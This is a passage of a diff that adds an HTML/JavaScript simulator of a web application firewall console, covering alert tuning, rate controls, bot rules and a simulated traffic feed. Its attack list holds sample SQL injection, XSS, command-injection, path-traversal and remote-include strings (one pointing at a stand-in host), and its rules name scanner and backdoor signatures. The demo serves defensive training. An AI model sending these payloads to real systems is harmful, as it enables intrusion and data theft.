@@ -1,0 +1,2106 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>Akamai App &amp; API Protector — Simulator</title>
+<meta name="viewport" content="width=1280" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-0: #0a0e14;
+    --bg-1: #11161f;
+    --bg-2: #161c28;
+    --bg-3: #1d2533;
+    --bg-4: #252e3f;
+    --line: #2a3447;
+    --line-2: #364159;
+    --text-0: #e6edf7;
+    --text-1: #aab4c5;
+    --text-2: #6e7889;
+    --text-3: #4a5161;
+    --accent: #ff8b2c;     /* akamai-ish orange */
+    --accent-dim: #c66a1f;
+    --danger: #ff4d5e;
+    --danger-bg: rgba(255, 77, 94, 0.08);
+    --warn: #ffbf3d;
+    --warn-bg: rgba(255, 191, 61, 0.08);
+    --ok: #34d399;
+    --ok-bg: rgba(52, 211, 153, 0.08);
+    --info: #5eb3ff;
+    --info-bg: rgba(94, 179, 255, 0.08);
+    --purple: #a78bff;
+  }
+
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0; padding: 0;
+    background: var(--bg-0);
+    color: var(--text-0);
+    font-family: 'IBM Plex Sans', system-ui, sans-serif;
+    font-size: 13px;
+    line-height: 1.4;
+    overflow-x: hidden;
+  }
+  .mono { font-family: 'IBM Plex Mono', monospace; }
+  button { font-family: inherit; }
+
+  /* ============ SHELL ============ */
+  .app {
+    display: grid;
+    grid-template-columns: 220px 1fr;
+    grid-template-rows: 48px 1fr;
+    height: 100vh;
+  }
+  .topbar {
+    grid-column: 1 / -1;
+    background: var(--bg-1);
+    border-bottom: 1px solid var(--line);
+    display: flex;
+    align-items: center;
+    padding: 0 16px;
+    gap: 16px;
+    z-index: 10;
+  }
+  .logo {
+    font-family: 'Space Grotesk', sans-serif;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    color: var(--text-0);
+    font-size: 15px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .logo-mark {
+    width: 22px; height: 22px;
+    background: var(--accent);
+    border-radius: 4px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--bg-0);
+    font-weight: 800;
+    font-size: 12px;
+  }
+  .logo small {
+    font-size: 10px;
+    color: var(--text-2);
+    font-weight: 400;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-left: 4px;
+  }
+  .topbar .crumbs {
+    color: var(--text-2);
+    font-size: 12px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .crumbs .sep { color: var(--text-3); }
+  .crumbs .here { color: var(--text-0); }
+  .topbar .spacer { flex: 1; }
+  .env-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--bg-3);
+    border: 1px solid var(--line);
+    padding: 4px 10px;
+    border-radius: 4px;
+    font-size: 11px;
+    color: var(--text-1);
+    cursor: pointer;
+  }
+  .env-pill .dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--warn);
+  }
+  .env-pill.prod .dot { background: var(--ok); }
+  .user-chip {
+    width: 28px; height: 28px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--accent), var(--danger));
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--bg-0);
+  }
+
+  .sidebar {
+    background: var(--bg-1);
+    border-right: 1px solid var(--line);
+    padding: 12px 0;
+    overflow-y: auto;
+  }
+  .nav-section {
+    padding: 8px 16px 4px;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--text-3);
+    font-weight: 600;
+  }
+  .nav-item {
+    padding: 7px 16px;
+    color: var(--text-1);
+    cursor: pointer;
+    font-size: 12.5px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    border-left: 2px solid transparent;
+  }
+  .nav-item:hover {
+    background: var(--bg-2);
+    color: var(--text-0);
+  }
+  .nav-item.active {
+    background: var(--bg-2);
+    color: var(--accent);
+    border-left-color: var(--accent);
+  }
+  .nav-item .badge {
+    margin-left: auto;
+    background: var(--danger);
+    color: var(--bg-0);
+    font-size: 10px;
+    padding: 1px 6px;
+    border-radius: 8px;
+    font-weight: 600;
+    font-family: 'IBM Plex Mono', monospace;
+  }
+  .nav-item .badge.warn { background: var(--warn); }
+
+  .main {
+    overflow-y: auto;
+    overflow-x: hidden;
+    background: var(--bg-0);
+  }
+  .page {
+    padding: 20px 24px 60px;
+  }
+  .page-head {
+    display: flex;
+    align-items: flex-end;
+    justify-content: space-between;
+    margin-bottom: 20px;
+    padding-bottom: 14px;
+    border-bottom: 1px solid var(--line);
+  }
+  .page-title {
+    font-family: 'Space Grotesk', sans-serif;
+    font-weight: 600;
+    font-size: 22px;
+    letter-spacing: -0.01em;
+    margin: 0;
+  }
+  .page-sub {
+    color: var(--text-2);
+    font-size: 12px;
+    margin-top: 4px;
+  }
+
+  /* ============ BUTTONS ============ */
+  .btn {
+    background: var(--bg-3);
+    color: var(--text-0);
+    border: 1px solid var(--line-2);
+    padding: 6px 12px;
+    font-size: 12px;
+    cursor: pointer;
+    border-radius: 3px;
+    font-weight: 500;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .btn:hover { background: var(--bg-4); border-color: var(--text-3); }
+  .btn.primary {
+    background: var(--accent);
+    color: var(--bg-0);
+    border-color: var(--accent);
+    font-weight: 600;
+  }
+  .btn.primary:hover { background: #ff9c4d; }
+  .btn.danger {
+    background: transparent;
+    color: var(--danger);
+    border-color: var(--danger);
+  }
+  .btn.ghost {
+    background: transparent;
+    border-color: var(--line);
+    color: var(--text-1);
+  }
+  .btn.sm { padding: 3px 8px; font-size: 11px; }
+  .btn-row { display: flex; gap: 8px; }
+
+  /* ============ CARDS ============ */
+  .card {
+    background: var(--bg-1);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+  }
+  .card-head {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--line);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .card-title {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-0);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+  .card-body { padding: 16px; }
+
+  /* ============ DASHBOARD ============ */
+  .stat-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+  .stat {
+    background: var(--bg-1);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+    padding: 14px 16px;
+    position: relative;
+    overflow: hidden;
+  }
+  .stat .label {
+    color: var(--text-2);
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 6px;
+  }
+  .stat .value {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 26px;
+    font-weight: 600;
+    letter-spacing: -0.02em;
+  }
+  .stat .delta {
+    font-size: 11px;
+    margin-top: 4px;
+    font-family: 'IBM Plex Mono', monospace;
+  }
+  .stat .delta.up { color: var(--danger); }
+  .stat .delta.down { color: var(--ok); }
+  .stat .spark {
+    position: absolute;
+    right: 12px; top: 12px;
+    width: 80px; height: 36px;
+    opacity: 0.5;
+  }
+
+  .dash-grid {
+    display: grid;
+    grid-template-columns: 2fr 1fr;
+    gap: 12px;
+  }
+
+  /* live traffic feed */
+  .feed-row {
+    display: grid;
+    grid-template-columns: 80px 60px 90px 1fr 100px 80px;
+    gap: 8px;
+    padding: 8px 12px;
+    font-size: 11.5px;
+    border-bottom: 1px solid var(--line);
+    align-items: center;
+    font-family: 'IBM Plex Mono', monospace;
+    animation: feed-in 280ms ease;
+  }
+  @keyframes feed-in {
+    from { background: var(--bg-3); transform: translateY(-4px); opacity: 0; }
+    to { background: transparent; transform: translateY(0); opacity: 1; }
+  }
+  .feed-row:hover { background: var(--bg-2); cursor: pointer; }
+  .feed-time { color: var(--text-2); }
+  .feed-method {
+    background: var(--bg-3);
+    border-radius: 2px;
+    padding: 1px 5px;
+    font-size: 10px;
+    text-align: center;
+    color: var(--info);
+  }
+  .feed-method.POST { color: var(--warn); }
+  .feed-ip { color: var(--text-1); }
+  .feed-path { color: var(--text-0); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .feed-rule { font-size: 10px; color: var(--text-2); }
+  .feed-action {
+    text-align: right;
+    font-weight: 600;
+    font-size: 11px;
+  }
+  .feed-action.deny { color: var(--danger); }
+  .feed-action.alert { color: var(--warn); }
+  .feed-action.allow { color: var(--ok); }
+  .feed-action.monitor { color: var(--info); }
+
+  .feed-scroll {
+    max-height: 480px;
+    overflow-y: auto;
+  }
+
+  .attack-list .row {
+    display: flex;
+    align-items: center;
+    padding: 9px 16px;
+    border-bottom: 1px solid var(--line);
+    font-size: 12px;
+  }
+  .attack-list .row:last-child { border-bottom: none; }
+  .attack-list .name { flex: 1; }
+  .attack-list .count {
+    font-family: 'IBM Plex Mono', monospace;
+    color: var(--text-1);
+    margin-right: 12px;
+  }
+  .bar-wrap {
+    width: 100px;
+    height: 4px;
+    background: var(--bg-3);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .bar-fill {
+    height: 100%;
+    background: var(--accent);
+    transition: width 0.6s;
+  }
+
+  /* ============ ALERT TUNING ============ */
+  .tuning-grid {
+    display: grid;
+    grid-template-columns: 1fr 380px;
+    gap: 12px;
+  }
+  .rule-card {
+    background: var(--bg-1);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+    margin-bottom: 10px;
+    overflow: hidden;
+  }
+  .rule-card.expanded { border-color: var(--accent-dim); }
+  .rule-head {
+    display: grid;
+    grid-template-columns: 32px 1fr auto auto auto;
+    gap: 12px;
+    align-items: center;
+    padding: 12px 14px;
+    cursor: pointer;
+  }
+  .rule-head:hover { background: var(--bg-2); }
+  .rule-severity {
+    width: 4px;
+    height: 28px;
+    border-radius: 2px;
+    background: var(--text-3);
+  }
+  .rule-severity.critical { background: var(--danger); }
+  .rule-severity.high { background: var(--accent); }
+  .rule-severity.medium { background: var(--warn); }
+  .rule-severity.low { background: var(--info); }
+  .rule-name {
+    font-weight: 500;
+    font-size: 13px;
+  }
+  .rule-meta {
+    font-size: 11px;
+    color: var(--text-2);
+    margin-top: 2px;
+    font-family: 'IBM Plex Mono', monospace;
+  }
+  .triggers {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    color: var(--text-1);
+    background: var(--bg-3);
+    padding: 3px 8px;
+    border-radius: 3px;
+  }
+  .triggers.hot { color: var(--danger); background: var(--danger-bg); }
+  .action-select {
+    background: var(--bg-3);
+    border: 1px solid var(--line-2);
+    color: var(--text-0);
+    padding: 4px 8px;
+    border-radius: 3px;
+    font-size: 11px;
+    font-family: inherit;
+  }
+  .rule-detail {
+    padding: 0 14px 14px;
+    border-top: 1px solid var(--line);
+    background: var(--bg-2);
+  }
+  .rule-detail-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+    padding-top: 14px;
+  }
+  .field {
+    margin-bottom: 10px;
+  }
+  .field-label {
+    color: var(--text-2);
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 4px;
+  }
+  .field-value {
+    font-size: 12px;
+    font-family: 'IBM Plex Mono', monospace;
+    color: var(--text-0);
+  }
+  .exception-block {
+    margin-top: 10px;
+    padding: 10px 12px;
+    background: var(--bg-3);
+    border-radius: 3px;
+    border-left: 2px solid var(--info);
+  }
+  .exception-block .title {
+    font-size: 11px;
+    color: var(--info);
+    margin-bottom: 6px;
+    font-weight: 600;
+  }
+  .input {
+    background: var(--bg-1);
+    border: 1px solid var(--line-2);
+    color: var(--text-0);
+    padding: 5px 8px;
+    font-size: 11.5px;
+    font-family: 'IBM Plex Mono', monospace;
+    border-radius: 3px;
+    width: 100%;
+  }
+  .input:focus { outline: none; border-color: var(--accent); }
+
+  /* slider */
+  .sens-wrap {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-top: 4px;
+  }
+  .sens-slider {
+    flex: 1;
+    -webkit-appearance: none;
+    appearance: none;
+    height: 4px;
+    background: var(--bg-3);
+    border-radius: 2px;
+    outline: none;
+  }
+  .sens-slider::-webkit-slider-thumb {
+    -webkit-appearance: none;
+    appearance: none;
+    width: 14px; height: 14px;
+    border-radius: 50%;
+    background: var(--accent);
+    cursor: pointer;
+    border: 2px solid var(--bg-0);
+  }
+  .sens-slider::-moz-range-thumb {
+    width: 14px; height: 14px;
+    border-radius: 50%;
+    background: var(--accent);
+    cursor: pointer;
+    border: 2px solid var(--bg-0);
+  }
+  .sens-val {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    color: var(--accent);
+    min-width: 30px;
+    text-align: right;
+  }
+
+  /* recommendation panel */
+  .rec-panel { padding: 14px 16px; }
+  .rec-item {
+    padding: 12px;
+    background: var(--bg-2);
+    border-left: 3px solid var(--warn);
+    border-radius: 0 3px 3px 0;
+    margin-bottom: 10px;
+    font-size: 12px;
+  }
+  .rec-item.info { border-left-color: var(--info); }
+  .rec-item.ok { border-left-color: var(--ok); }
+  .rec-item .head {
+    font-weight: 600;
+    margin-bottom: 4px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .rec-item .body {
+    color: var(--text-1);
+    font-size: 11.5px;
+    line-height: 1.5;
+    margin-bottom: 8px;
+  }
+  .rec-item .applied {
+    font-size: 11px;
+    color: var(--ok);
+    font-style: italic;
+  }
+
+  /* ============ RATE / CUSTOM / BOTS / REPORTS ============ */
+  .table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+  }
+  .table th {
+    text-align: left;
+    padding: 10px 12px;
+    background: var(--bg-2);
+    color: var(--text-2);
+    text-transform: uppercase;
+    font-size: 10px;
+    letter-spacing: 0.08em;
+    font-weight: 600;
+    border-bottom: 1px solid var(--line);
+  }
+  .table td {
+    padding: 10px 12px;
+    border-bottom: 1px solid var(--line);
+  }
+  .table tr:hover td { background: var(--bg-2); }
+
+  .pill {
+    display: inline-block;
+    padding: 1px 8px;
+    border-radius: 10px;
+    font-size: 10px;
+    font-weight: 600;
+    font-family: 'IBM Plex Mono', monospace;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .pill.alert { background: var(--warn-bg); color: var(--warn); }
+  .pill.deny  { background: var(--danger-bg); color: var(--danger); }
+  .pill.none  { background: var(--bg-3); color: var(--text-2); }
+  .pill.monitor { background: var(--info-bg); color: var(--info); }
+  .pill.active { background: var(--ok-bg); color: var(--ok); }
+
+  /* ============ TOAST ============ */
+  .toast-area {
+    position: fixed;
+    bottom: 20px; right: 20px;
+    z-index: 100;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+  .toast {
+    background: var(--bg-2);
+    border: 1px solid var(--line-2);
+    border-left: 3px solid var(--ok);
+    padding: 10px 14px;
+    border-radius: 3px;
+    font-size: 12px;
+    min-width: 260px;
+    animation: toast-in 0.3s ease;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+  }
+  .toast.info { border-left-color: var(--info); }
+  .toast.warn { border-left-color: var(--warn); }
+  .toast .t-title { font-weight: 600; margin-bottom: 2px; }
+  .toast .t-body { color: var(--text-2); font-size: 11px; }
+  @keyframes toast-in {
+    from { transform: translateX(20px); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+  }
+
+  /* ============ TOUR ============ */
+  .tour-backdrop {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.65);
+    z-index: 1000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .tour-card {
+    background: var(--bg-1);
+    border: 1px solid var(--line-2);
+    border-radius: 6px;
+    max-width: 520px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+    overflow: hidden;
+  }
+  .tour-head {
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--line);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .tour-step {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    color: var(--accent);
+    background: var(--accent-dim);
+    color: var(--bg-0);
+    padding: 2px 8px;
+    border-radius: 10px;
+    font-weight: 700;
+  }
+  .tour-title {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 16px;
+    font-weight: 600;
+  }
+  .tour-body {
+    padding: 18px 20px;
+    color: var(--text-1);
+    font-size: 13px;
+    line-height: 1.55;
+  }
+  .tour-body strong { color: var(--text-0); }
+  .tour-body code {
+    background: var(--bg-3);
+    color: var(--accent);
+    padding: 1px 6px;
+    border-radius: 3px;
+    font-size: 11.5px;
+  }
+  .tour-foot {
+    padding: 12px 20px;
+    border-top: 1px solid var(--line);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .tour-progress {
+    display: flex;
+    gap: 4px;
+  }
+  .tour-progress .dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--bg-3);
+  }
+  .tour-progress .dot.active { background: var(--accent); }
+  .tour-progress .dot.done { background: var(--accent-dim); }
+
+  /* ============ DETAIL DRAWER ============ */
+  .drawer-backdrop {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.5);
+    z-index: 50;
+  }
+  .drawer {
+    position: fixed;
+    right: 0; top: 0; bottom: 0;
+    width: 520px;
+    background: var(--bg-1);
+    border-left: 1px solid var(--line);
+    z-index: 51;
+    overflow-y: auto;
+    animation: drawer-in 0.25s ease;
+  }
+  @keyframes drawer-in {
+    from { transform: translateX(20px); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+  }
+  .drawer-head {
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--line);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .drawer-body { padding: 20px; }
+  .req-block {
+    background: var(--bg-0);
+    border: 1px solid var(--line);
+    border-radius: 3px;
+    padding: 12px;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11.5px;
+    color: var(--text-1);
+    white-space: pre-wrap;
+    word-break: break-all;
+    margin-top: 6px;
+  }
+  .req-block .hl { color: var(--danger); background: rgba(255,77,94,0.12); padding: 0 2px; }
+
+  /* generic */
+  .row-flex { display: flex; gap: 10px; align-items: center; }
+  .gap8 { gap: 8px; }
+  .mt8 { margin-top: 8px; }
+  .mt12 { margin-top: 12px; }
+  .mt16 { margin-top: 16px; }
+  .mb8 { margin-bottom: 8px; }
+  .mb12 { margin-bottom: 12px; }
+  .mb16 { margin-bottom: 16px; }
+  .text-2 { color: var(--text-2); }
+  .text-mono { font-family: 'IBM Plex Mono', monospace; }
+  .small { font-size: 11px; }
+
+  /* config selector banner */
+  .config-banner {
+    background: linear-gradient(90deg, var(--bg-2), var(--bg-1));
+    border: 1px solid var(--line);
+    border-left: 3px solid var(--accent);
+    padding: 10px 14px;
+    border-radius: 3px;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 12px;
+  }
+  .config-banner b { color: var(--accent); }
+
+  /* scrollbar */
+  ::-webkit-scrollbar { width: 10px; height: 10px; }
+  ::-webkit-scrollbar-track { background: var(--bg-0); }
+  ::-webkit-scrollbar-thumb { background: var(--bg-3); border-radius: 5px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--bg-4); }
+
+  /* small chart */
+  .chart-svg { width: 100%; height: 160px; }
+  .chart-axis { stroke: var(--line); }
+  .chart-grid { stroke: var(--line); stroke-dasharray: 2 4; opacity: 0.4; }
+  .chart-area { fill: var(--accent); opacity: 0.15; }
+  .chart-line { stroke: var(--accent); stroke-width: 1.5; fill: none; }
+
+  .blink {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--ok);
+    display: inline-block;
+    animation: blink 1.4s infinite;
+    margin-right: 6px;
+  }
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  /* activation modal */
+  .modal-backdrop {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.6);
+    z-index: 200;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .modal {
+    background: var(--bg-1);
+    border: 1px solid var(--line-2);
+    border-radius: 6px;
+    width: 480px;
+    overflow: hidden;
+  }
+  .progress-bar {
+    height: 4px;
+    background: var(--bg-3);
+    border-radius: 2px;
+    overflow: hidden;
+    margin-top: 8px;
+  }
+  .progress-fill {
+    height: 100%;
+    background: var(--accent);
+    transition: width 0.3s;
+  }
+</style>
+</head>
+<body>
+
+<div class="app" id="app">
+  <!-- Topbar -->
+  <div class="topbar">
+    <div class="logo">
+      <span class="logo-mark">A</span> AKAMAI <small>App &amp; API Protector — Simulator</small>
+    </div>
+    <div class="crumbs">
+      <span>Security Configurations</span>
+      <span class="sep">/</span>
+      <span class="here" id="crumbHere">Dashboard</span>
+    </div>
+    <div class="spacer"></div>
+    <div class="env-pill" id="envPill" title="Click to toggle Staging/Production">
+      <span class="dot"></span>
+      <span id="envLabel">STAGING · v17</span>
+    </div>
+    <button class="btn ghost" onclick="startTour(0)">Guided Tour</button>
+    <button class="btn primary" onclick="openActivate()">Activate</button>
+    <div class="user-chip">SE</div>
+  </div>
+
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <div class="nav-section">Security</div>
+    <div class="nav-item" data-page="dashboard"><span>◧</span> Dashboard</div>
+    <div class="nav-item" data-page="tuning"><span>◐</span> Alert Tuning <span class="badge" id="navTuneCount">12</span></div>
+    <div class="nav-item" data-page="waf"><span>▤</span> WAF Rules</div>
+    <div class="nav-item" data-page="rate"><span>◴</span> Rate Controls</div>
+    <div class="nav-item" data-page="custom"><span>◇</span> Custom Rules</div>
+    <div class="nav-item" data-page="bots"><span>◉</span> Bot Manager</div>
+
+    <div class="nav-section" style="margin-top:14px;">Insights</div>
+    <div class="nav-item" data-page="reports"><span>≣</span> Reports</div>
+    <div class="nav-item" data-page="adaptive"><span>※</span> Adaptive Engine <span class="badge warn">3</span></div>
+
+    <div class="nav-section" style="margin-top:14px;">Config</div>
+    <div class="nav-item" data-page="settings"><span>⚙</span> Match Targets</div>
+    <div class="nav-item" data-page="history"><span>⟲</span> Version History</div>
+  </div>
+
+  <!-- Main -->
+  <div class="main" id="main"></div>
+</div>
+
+<div class="toast-area" id="toasts"></div>
+<div id="overlay"></div>
+
+<script>
+/* =============================================================
+   STATE
+   ============================================================= */
+const STATE = {
+  page: 'dashboard',
+  env: 'staging',
+  config: 'prod-www-akamai-corp',
+  feed: [],          // live traffic
+  feedPaused: false,
+  toasts: [],
+  selectedRequest: null,
+  pendingChanges: 0,
+  activeTour: null,
+  tourStep: 0,
+  attackGroups: [
+    // sensitivity 1..10, action: alert|deny|none
+    { id:'SQL', name:'SQL Injection', triggers: 0, fp: 0, sens: 8, action: 'alert', severity:'critical',
+      desc: 'Detects SQL injection attempts via signatures, anomaly scoring, and tautology detection.' },
+    { id:'XSS', name:'Cross-Site Scripting (XSS)', triggers: 0, fp: 0, sens: 7, action: 'alert', severity:'critical',
+      desc: 'Detects script injection in headers, query strings, and request bodies.' },
+    { id:'CMDI', name:'Command Injection', triggers: 0, fp: 0, sens: 7, action: 'deny', severity:'critical',
+      desc: 'OS command injection patterns (cat, /etc/passwd, ;, |, backtick).' },
+    { id:'LFI', name:'Local File Inclusion', triggers: 0, fp: 0, sens: 6, action: 'alert', severity:'high',
+      desc: 'Path traversal and local file inclusion (../, /etc/, \\\\).' },
+    { id:'RFI', name:'Remote File Inclusion', triggers: 0, fp: 0, sens: 6, action: 'alert', severity:'high',
+      desc: 'Inclusion of remote URLs in parameters (http://evil.tld/...).' },
+    { id:'PROTO', name:'Protocol Attack', triggers: 0, fp: 0, sens: 5, action: 'alert', severity:'medium',
+      desc: 'HTTP smuggling, malformed headers, oversized requests.' },
+    { id:'PHP', name:'PHP Injection', triggers: 0, fp: 0, sens: 5, action: 'alert', severity:'medium',
+      desc: 'PHP-specific injection (eval(), passthru(), wrappers).' },
+    { id:'TROJAN', name:'Trojan / Backdoor', triggers: 0, fp: 0, sens: 9, action: 'deny', severity:'critical',
+      desc: 'Known shell/backdoor signatures (c99, r57, b374k).' },
+    { id:'PLAT', name:'Platform / CVE', triggers: 0, fp: 0, sens: 7, action: 'alert', severity:'high',
+      desc: 'Targeted exploits for known CVEs (Log4Shell, Spring4Shell, etc.).' },
+    { id:'OUTPUT', name:'Outbound Data Leakage', triggers: 0, fp: 0, sens: 3, action: 'alert', severity:'medium',
+      desc: 'Server error patterns indicating data exposure.' }
+  ],
+  exceptions: [], // {ruleId, criterion, pattern}
+  rateRules: [
+    { id:'rl-1', name:'API Login Brute Force', match:'/api/v1/auth/login', threshold: 5, window: 60, action:'deny', state:'active', triggers: 0 },
+    { id:'rl-2', name:'Checkout Flood',         match:'/checkout/*',        threshold: 30, window: 60, action:'alert', state:'active', triggers: 0 },
+    { id:'rl-3', name:'Burst per IP',           match:'/*',                 threshold: 200, window: 10, action:'alert', state:'active', triggers: 0 }
+  ],
+  customRules: [
+    { id:'cr-1', name:'Block known scanner UAs', condition:'User-Agent matches (sqlmap|nikto|nuclei|wpscan)', action:'deny', state:'active', triggers: 0 },
+    { id:'cr-2', name:'Allow internal CIDR',     condition:'Source IP in 10.40.0.0/16', action:'allow', state:'active', triggers: 0 },
+    { id:'cr-3', name:'Geo-block sanctioned',    condition:'Country in [KP, IR, SY]', action:'deny', state:'active', triggers: 0 }
+  ],
+  botCategories: [
+    { name:'Search Engines', cat:'good', action:'allow', triggers: 0 },
+    { name:'Site Monitoring', cat:'good', action:'allow', triggers: 0 },
+    { name:'Web Scrapers', cat:'bad', action:'deny', triggers: 0 },
+    { name:'Inventory Scrapers', cat:'bad', action:'deny', triggers: 0 },
+    { name:'Vulnerability Scanners', cat:'bad', action:'deny', triggers: 0 },
+    { name:'Headless Browsers', cat:'unknown', action:'alert', triggers: 0 }
+  ],
+  metrics: {
+    totalReq: 0,
+    totalBlocked: 0,
+    totalAlerts: 0,
+    falsePositives: 0,
+    sparkHist: Array(40).fill(0)
+  },
+  recommendations: [
+    { id:'rec-1', kind:'warn', applied:false,
+      title:'High false-positive rate on XSS-942100',
+      body:'Rule XSS-942100 has flagged 47 requests in the last hour that pattern-match your Markdown editor saves on <code>/api/v1/notes</code>. the Adaptive Security Engine recommends adding an exception for <code>POST /api/v1/notes</code> on the <code>body.content</code> field.',
+      apply: () => {
+        STATE.exceptions.push({ ruleId:'XSS', criterion:'POST /api/v1/notes → body.content', pattern:'exclude markdown HTML tokens' });
+        toast('Exception applied', 'XSS rule scoped: notes endpoint excluded.', 'ok');
+      }
+    },
+    { id:'rec-2', kind:'info', applied:false,
+      title:'Suggested action change: LFI from alert → deny',
+      body:'Over the last 7 days, 100% of LFI-triggered requests resulted in 4xx responses upstream. No legitimate traffic has triggered this rule. Recommend escalating action from <code>alert</code> to <code>deny</code>.',
+      apply: () => {
+        const g = STATE.attackGroups.find(g=>g.id==='LFI'); g.action = 'deny';
+        toast('Action upgraded', 'LFI now denying matched traffic.', 'ok');
+      }
+    },
+    { id:'rec-3', kind:'warn', applied:false,
+      title:'Penalty Box candidate: 203.0.113.42',
+      body:'IP <code>203.0.113.42</code> has triggered 11 rules in the past 5 minutes across SQLi/XSS/LFI. Consider adding to the Penalty Box (15-min auto-deny).',
+      apply: () => {
+        toast('Penalty Box engaged', '203.0.113.42 will be denied for 15 minutes.', 'ok');
+      }
+    }
+  ]
+};
+
+// helpers
+const $ = (sel, root=document) => root.querySelector(sel);
+const $$ = (sel, root=document) => Array.from(root.querySelectorAll(sel));
+const fmt = n => n.toLocaleString();
+const now = () => {
+  const d = new Date();
+  return d.toTimeString().slice(0,8) + '.' + String(d.getMilliseconds()).padStart(3,'0').slice(0,3);
+};
+
+/* =============================================================
+   TRAFFIC SIMULATION ENGINE
+   ============================================================= */
+const IP_POOL = [
+  '203.0.113.42','198.51.100.7','192.0.2.55','45.33.32.156','185.220.101.18',
+  '104.244.76.187','51.158.107.213','77.83.36.214','185.234.218.85','193.32.162.27',
+  '8.8.8.8','1.1.1.1','10.40.5.21','10.40.5.55'
+];
+
+const PATHS_BENIGN = [
+  ['GET','/'],['GET','/products'],['GET','/products/sku-2243'],['GET','/about'],
+  ['GET','/blog'],['GET','/blog/why-edge-security'],['GET','/api/v1/products?cat=shoes'],
+  ['POST','/api/v1/cart'],['POST','/api/v1/notes'],['GET','/static/app.js'],
+  ['GET','/favicon.ico'],['POST','/api/v1/auth/login'],['GET','/checkout/cart'],
+  ['POST','/checkout/submit'],['GET','/account'],['GET','/api/v1/search?q=running+shoes']
+];
+
+const ATTACKS = [
+  { rule:'SQL',    method:'GET',  path:"/api/v1/search?q=' OR 1=1--",         note:'tautology' },
+  { rule:'SQL',    method:'POST', path:'/api/v1/auth/login',                  note:'UNION SELECT password FROM users' },
+  { rule:'XSS',    method:'GET',  path:"/blog?ref=<script>alert(1)<\/script>", note:'reflected XSS' },
+  { rule:'XSS',    method:'POST', path:'/api/v1/notes',                       note:'<img src=x onerror=>' },
+  { rule:'CMDI',   method:'GET',  path:'/api/v1/diag?host=;cat /etc/passwd',  note:'command chaining' },
+  { rule:'LFI',    method:'GET',  path:'/api/v1/file?path=../../../../etc/passwd', note:'path traversal' },
+  { rule:'RFI',    method:'GET',  path:'/api/v1/img?src=http://evil.tld/sh.php',    note:'remote include' },
+  { rule:'PROTO',  method:'POST', path:'/api/v1/upload',                      note:'malformed Content-Length' },
+  { rule:'PHP',    method:'POST', path:'/wp-content/uploads/shell.php',       note:'php wrapper' },
